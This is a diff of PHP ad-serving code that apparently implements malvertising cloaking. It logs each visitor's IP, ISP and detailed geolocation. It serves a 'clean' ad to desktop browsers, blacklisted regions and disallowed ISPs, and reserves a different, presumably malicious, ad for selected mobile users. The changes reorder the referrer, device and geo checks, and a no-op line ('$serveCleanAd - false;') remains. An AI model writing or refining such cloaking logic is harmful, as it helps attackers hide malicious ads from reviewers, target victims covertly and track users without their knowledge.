@@ -716,60 +716,25 @@
 		$adCountry = "US";
 	}
 
+	$ip  = getClientIP();
+	$geo = getGEOInfo($ip);
+	$isp = getISPInfo($ip);
+
+	geoisplog(
+		'ip:"'.$ip.'",'.
+		'isp:"'.$isp['isp'].'",'.
+		'city:"'.$geo['city'].'",'.
+		'province:"'.$geo['province'].'",'.
+		'country:"'.$geo['country'].'",'.
+		'country_code:"'.$geo['country_code'].'",'.
+		'continent:"'.$geo['continent'].'",'.
+		'continent_code:"'.$geo['continent_code'].'",'.
+		'subdiv1:"'.$geo['subdiv1'].'",'.
+		'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
+		'subdiv2:"'.$geo['subdiv2'].'",'.
+		'subdiv2_code:"'.$geo['subdiv2_code'].'"');
+
 	$serveCleanAd = false;
-
-	if (!preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
-	{
-		$serveCleanAd = true;
-
-		adlog("UserAgent is not a mobile device.");
-	}
-	else
-	{
-		$ip  = getClientIP();
-		$geo = getGEOInfo($ip);
-		$isp = getISPInfo($ip);
-
-		geoisplog(
-			'ip:"'.$ip.'",'.
-			'isp:"'.$isp['isp'].'",'.
-			'city:"'.$geo['city'].'",'.
-			'province:"'.$geo['province'].'",'.
-			'country:"'.$geo['country'].'",'.
-			'country_code:"'.$geo['country_code'].'",'.
-			'continent:"'.$geo['continent'].'",'.
-			'continent_code:"'.$geo['continent_code'].'",'.
-			'subdiv1:"'.$geo['subdiv1'].'",'.
-			'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
-			'subdiv2:"'.$geo['subdiv2'].'",'.
-			'subdiv2_code:"'.$geo['subdiv2_code'].'"');
-
-		$allowedIsps = array();
-
-		if (array_key_exists($adCountry, $allowedIspsPerCountry))
-		{
-			$allowedIsps = $allowedIspsPerCountry[$adCountry];
-		}
-
-		if ((empty($allowedIsps) || in_array($isp['isp'], $allowedIsps)) &&
-			!in_array($geo['city'], $blacklistedCities) &&
-			!in_array($geo['province'], $blacklistedProvinces) &&
-			!in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
-			!in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
-			!in_array($geo['country'], $blacklistedCountries) &&
-			!in_array($geo['continent'], $blacklistedContinents))
-		{
-			$serveCleanAd - false;
-
-			adlog("ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
-		}
-		else
-		{
-			$serveCleanAd = true;
-
-			adlog("ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
-		}
-	}
 
 	if (!$serveCleanAd && array_key_exists('HTTP_REFERER', $_SERVER))
 	{
@@ -809,6 +774,41 @@
 
 				break;
 			}
+		}
+	}	
+
+	if (!$serveCleanAd && !preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
+	{
+		$serveCleanAd = true;
+
+		adlog("UserAgent is not a mobile device.");
+	}
+	elseif (!$serveCleanAd)
+	{
+		$allowedIsps = array();
+
+		if (array_key_exists($adCountry, $allowedIspsPerCountry))
+		{
+			$allowedIsps = $allowedIspsPerCountry[$adCountry];
+		}
+
+		if ((empty($allowedIsps) || in_array($isp['isp'], $allowedIsps)) &&
+			!in_array($geo['city'], $blacklistedCities) &&
+			!in_array($geo['province'], $blacklistedProvinces) &&
+			!in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
+			!in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
+			!in_array($geo['country'], $blacklistedCountries) &&
+			!in_array($geo['continent'], $blacklistedContinents))
+		{
+			$serveCleanAd - false;
+
+			adlog("ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
+		}
+		else
+		{
+			$serveCleanAd = true;
+
+			adlog("ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 		}
 	}
 
